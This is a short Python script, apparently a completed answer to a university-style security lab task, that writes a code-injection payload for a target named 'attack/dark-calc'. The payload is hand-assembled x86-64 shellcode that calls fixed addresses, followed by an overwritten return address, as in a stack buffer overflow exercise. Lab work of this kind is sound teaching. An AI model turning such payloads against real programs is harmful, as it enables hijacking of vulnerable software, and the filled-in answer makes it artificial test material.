#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = (
    b"\xbf\x04\x00\x00\x00"  # mov edi, 4
    b"\xb8\x87\x1a\x40\x00"  # mov eax, 0x401a87
    b"\xff\xd0"              # call rax
    b"\xbf\x00\x00\x00\x00"  # mov edi, 0
    b"\xb8\x80\x18\x40\x00"  # mov eax, 0x401880
    b"\xff\xe0"              # jmp rax
    b"\xd0\x0f\x80\x00\x10\x72\x00\x00"
)

sys.stdout.buffer.write(payload)
